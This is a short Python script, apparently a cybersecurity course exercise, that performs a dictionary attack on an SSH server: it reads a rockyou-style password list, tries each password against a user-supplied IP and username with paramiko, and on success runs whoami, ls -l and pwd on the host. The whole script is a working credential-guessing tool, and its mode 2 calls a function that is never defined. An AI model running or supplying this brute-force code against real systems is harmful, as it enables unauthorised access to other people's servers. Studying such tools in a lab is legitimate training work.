#!/usr/bin/env python3 
# Script Name:                  Class 17
# Author:                       Zachariah Woodbridge
# Date of latest revision:      30 Jan 2024
# Purpose:                      Adds to Class 16 the capability to authenticate to an SSH server by its IP address.
# Disclaimer:                   This script was written with the assistance of codeium.

# Declaration of imports
import paramiko
import time
import os
from nltk.corpus import words

def pw_filepath():
    while True:
        filepath = input("Input the complete filepath for the password list (press enter for default /home/rockyou-test.txt): ") or "/home/rockyou-test.txt"
        if os.path.isfile(filepath):
            return filepath
        else:
            print("File not found. Please enter a valid filepath.")

# Declare Functions
def offensive(filepath):
    # Open the wordlist
    with open(filepath, 'r') as file:
        line = file.readline()
        print(line)
        # Get the next line in the wordlist
        while line:
            # Print the stripped-down line
            line = line.rstrip()
            word = line
            print(word)
            time.sleep(1)
            # Get the next line in the wordlist
            line = file.readline()
        file.close()

def ssh_authentication(filepath):
    # Get user input for host, user, and password
    host = input("Provide IP address to SSH into: ")
    user = input("Input a username: ")
    port = 22
    #  create an object to handle SSH connection
    ssh = paramiko.SSHClient()

    # automatically add the host key
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # try to connect to the host
    try:
        with open(filepath, 'r') as file:
            passwords = [line.strip() for line in file]
            # iterate through the passwords
            for password in passwords:
                try:
                    ssh.connect(host, port, user, password)
                    stdin, stdout, stderr = ssh.exec_command("whoami")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("ls -l")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("pwd")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    print("Successful login using password:", password)
                    break  # Exit loop if successful login
                except paramiko.AuthenticationException:
                    print("Authentication failed using password:", password)
    # catch any errors
    except FileNotFoundError:
        print("File not found. Please check the filepath.")

# Main
def main():
    filepath = pw_filepath()
    # Print menu
    print("Select a mode:")
    print("Mode 1: Offensive; Dictionary Iterator")
    print("Mode 2: Defensive; Password Recognized ***DEFUNCT***")
    print("Mode 3: Authenticate to SSH Server")

    mode = input("Enter the mode number (1, 2, or 3): ")

    if mode == "1":
        offensive(filepath)
    elif mode == "2":
        defensive()
    elif mode == "3":
        ssh_authentication(filepath)
    else:
        print("Invalid mode selection.")
# Call the main function
if __name__ == "__main__":
    main()

# End
